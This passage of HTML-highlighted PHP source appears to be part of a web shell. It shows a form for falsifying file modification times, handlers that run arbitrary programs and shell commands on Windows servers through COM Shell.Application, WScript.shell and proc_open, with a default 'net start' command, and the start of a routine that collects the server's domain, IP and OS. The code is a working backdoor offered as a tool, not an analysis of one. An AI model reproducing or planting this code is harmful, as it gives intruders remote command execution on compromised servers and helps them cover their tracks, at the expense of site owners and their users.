<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Alter folder/file'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'curfile'</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">opf</span><span style="color: #eab700; text-decoration: underline;">ile</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Reference folder/file (fullpath)'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'tarfile</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfooter(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Set last modified'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'file'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>,$<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Current folder/file (fullpath)'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'curfile'</span>,<span style="color: #3e999f; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #eab700; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;year:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'year'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">date(</span><span style="color: #3e999f;">'Y'</span>,$<span style="color: #eab700;">opfilemtime</span>),<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">4</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'month:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'month'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">date(</span><span style="color: #3e999f;">'m'</span>,$<span style="color: #eab700;">opfilemtime</span>),<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">2</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'day:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'day'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">date(</span><span style="color: #3e999f;">'d'</span>,$<span style="color: #eab700;">opfilemtime</span>),<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">2</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'hour:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'hour'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">date(</span><span style="color: #3e999f;">'H'</span>,$<span style="color: #eab700;">opfilemtime</span>),<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">2</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'minute:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'minute'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">date(</span><span style="color: #3e999f;">'i'</span>,$<span style="color: #eab700;">opfilemtime</span>),<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'second:'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'second'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">date(</span><span style="color: #3e999f;">'s'</span>,$<span style="color: #eab700;">opfilemtime</span>),<span style="color: #3e999f;">'size'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfooter(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">goback(</span>);
}<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">end newtime</span>

<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'shell'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #c82829; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">program</span> &amp;&amp; $<span style="color: #eab700;">parameter</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">shell</span>= <span style="color: #718c00;">new</span> <span style="color: #4271ae;">COM</span>(<span style="color: #3e999f;">'Shell.Application'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">a</span> = $<span style="color: #eab700;">shell</span>-&gt;<span style="color: #4d4d4c; background-color: #ffffff;">ShellExecute</span>($<span style="color: #eab700;">program</span>,$<span style="color: #eab700;">parameter</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Program run has '</span>.(!$<span style="color: #eab700;">a</span> ? <span style="color: #3e999f;">'success'</span> : <span style="color: #3e999f;">'fail'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">program</span> &amp;&amp; $<span style="color: #eab700;">program</span> = <span style="color: #3e999f;">'c:\windows\system32\cmd.exe'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">parameter</span> &amp;&amp; $<span style="color: #eab700;">parameter</span> = <span style="color: #3e999f;">'/c net start &gt; '</span>.<span style="color: #c82829; font-weight: bold;">SA_ROOT</span>.<span style="color: #3e999f;">'log.txt'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Execute Program'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'shell'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Program'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'program'</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">program</span>,<span style="color: #3e999f;">'</span><span style="color: #3e999f; text-decoration: underline;">newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Parameter'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'parameter'</span>,<span style="color: #3e999f;">'value'</span>=&gt;$<span style="color: #eab700;">param</span><span style="color: #eab700; text-decoration: underline;">eter</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'submit'</span>,<span style="color: #3e999f;">'class'</span>=&gt;<span style="color: #3e999f;">'bt'</span>,<span style="color: #3e999f;">'type'</span>=&gt;<span style="color: #3e999f;">'submit'</span>,<span style="color: #3e999f;">'value'</span>=<span style="text-decoration: underline;">&gt;</span><span style="color: #3e999f; text-decoration: underline;">'Execute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Execute Command'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'shell'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #c82829; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">execfuncdb</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'phpfunc'</span>=&gt;<span style="color: #3e999f;">'phpfunc'</span>,<span style="color: #3e999f;">'wscript'</span>=&gt;<span style="color: #3e999f;">'wscript'</span>,<span style="color: #3e999f;">'proc_open</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #3e999f; text-decoration: underline;">'proc_open'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeselect(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Use:'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'execfunc'</span>,<span style="color: #3e999f;">'option'</span>=&gt;$<span style="color: #eab700;">execfuncd</span><span style="color: #eab700; text-decoration: underline;">b</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #eab700; text-decoration: underline;">execfunc</span><span style="text-decoration: underline;">,</span><span style="color: #3e999f; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'title'</span>=&gt;<span style="color: #3e999f;">'Command'</span>,<span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'command'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #4d4d4c; background-color: #ffffff;">htmlspecialcha</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">rs(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">command</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makeinput(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'submit'</span>,<span style="color: #3e999f;">'class'</span>=&gt;<span style="color: #3e999f;">'bt'</span>,<span style="color: #3e999f;">'type'</span>=&gt;<span style="color: #3e999f;">'submit'</span>,<span style="color: #3e999f;">'value'</span>=&gt;<span style="color: #3e999f;">'Ex</span><span style="color: #3e999f; text-decoration: underline;">ecute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">command</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;hr width="100%" noshade /&gt;&lt;pre&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">execfunc</span>==<span style="color: #3e999f;">'wscript'</span> &amp;&amp; <span style="color: #c82829; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #c82829; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">wsh</span> = <span style="color: #718c00;">new</span> <span style="color: #4271ae;">COM</span>(<span style="color: #3e999f;">'WScript.shell'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">exec</span> = $<span style="color: #eab700;">wsh</span>-&gt;<span style="color: #4d4d4c; background-color: #ffffff;">exec</span>(<span style="color: #3e999f;">'cmd.exe /c '</span>.$<span style="color: #eab700;">command</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">stdout</span> = $<span style="color: #eab700;">exec</span>-&gt;<span style="color: #4d4d4c; background-color: #ffffff;">StdOut</span>();
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">stroutput</span> = $<span style="color: #eab700;">stdout</span>-&gt;<span style="color: #4d4d4c; background-color: #ffffff;">ReadAll</span>();
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> $<span style="color: #eab700;">stroutput</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">execfunc</span>==<span style="color: #3e999f;">'proc_open'</span> &amp;&amp; <span style="color: #c82829; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #c82829; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">descriptorspec</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>  <span style="color: #4d4d4c; background-color: #ffffff;">0</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'pipe'</span>, <span style="color: #3e999f;">'r'</span>),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>  <span style="color: #4d4d4c; background-color: #ffffff;">1</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'pipe'</span>, <span style="color: #3e999f;">'w'</span>),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>  <span style="color: #4d4d4c; background-color: #ffffff;">2</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'pipe'</span>, <span style="color: #3e999f;">'w'</span>)
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   );
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">process</span> = <span style="color: #4d4d4c; background-color: #ffffff;">proc_open(</span>$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'COMSPEC'</span>], $<span style="color: #eab700;">descriptorspec</span>, $<span style="color: #eab700;">pipes</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">is_resource(</span>$<span style="color: #eab700;">process</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fwrite(</span>$<span style="color: #eab700;">pipes</span>[<span style="color: #4d4d4c; background-color: #ffffff;">0</span>], $<span style="color: #eab700;">command</span>.<span style="color: #3e999f;">"\r\n"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fwrite(</span>$<span style="color: #eab700;">pipes</span>[<span style="color: #4d4d4c; background-color: #ffffff;">0</span>], <span style="color: #3e999f;">"exit\r\n"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">pipes</span>[<span style="color: #4d4d4c; background-color: #ffffff;">0</span>]);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span> (!<span style="color: #4d4d4c; background-color: #ffffff;">feof(</span>$<span style="color: #eab700;">pipes</span>[<span style="color: #4d4d4c; background-color: #ffffff;">1</span>])) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> <span style="color: #4d4d4c; background-color: #ffffff;">fgets(</span>$<span style="color: #eab700;">pipes</span>[<span style="color: #4d4d4c; background-color: #ffffff;">1</span>], <span style="color: #4d4d4c; background-color: #ffffff;">1024</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">pipes</span>[<span style="color: #4d4d4c; background-color: #ffffff;">1</span>]);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span> (!<span style="color: #4d4d4c; background-color: #ffffff;">feof(</span>$<span style="color: #eab700;">pipes</span>[<span style="color: #4d4d4c; background-color: #ffffff;">2</span>])) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> <span style="color: #4d4d4c; background-color: #ffffff;">fgets(</span>$<span style="color: #eab700;">pipes</span>[<span style="color: #4d4d4c; background-color: #ffffff;">2</span>], <span style="color: #4d4d4c; background-color: #ffffff;">1024</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">pipes</span>[<span style="color: #4d4d4c; background-color: #ffffff;">2</span>]);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">proc_close(</span>$<span style="color: #eab700;">process</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span>(<span style="color: #4d4d4c; background-color: #ffffff;">execute(</span>$<span style="color: #eab700;">command</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/pre&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">end shell</span>

<span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'phpenv'</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">upsize</span>=<span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'file_uploads'</span>) ? <span style="color: #4d4d4c; background-color: #ffffff;">getcfg(</span><span style="color: #3e999f;">'upload_max_filesize'</span>) : <span style="color: #3e999f;">'Not allowe</span><span style="color: #3e999f; text-decoration: underline;">d'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">adminmail</span>=<span style="color: #4d4d4c; background-color: #ffffff;">isset(</span>$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'SERVER_ADMIN'</span>]) ? $<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'SERVER_ADMIN'</span>] : <span style="color: #4d4d4c; background-color: #ffffff;">getc</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">fg(</span><span style="color: #3e999f; text-decoration: underline;">'sendmail_from'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">dis_func</span> &amp;&amp; $<span style="color: #eab700;">dis_func</span> = <span style="color: #3e999f;">'No'</span>;<span style="color: #c82829; background-color: #d6d6d6;">     </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">info</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">1</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Server Time'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">date(</span><span style="color: #3e999f;">'Y/m/d h:i:s'</span>,$<span style="color: #eab700;">timestamp</span>)),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">2</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Server Domain'</span>,$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'SERVER_NAME'</span>]),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">3</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Server IP'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">gethostbyname(</span>$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">'SERVER_NAME'</span>])),
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">4</span> =&gt; <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">'Server OS'</span>,<span style="color: #4271ae;">PHP_OS</span>),
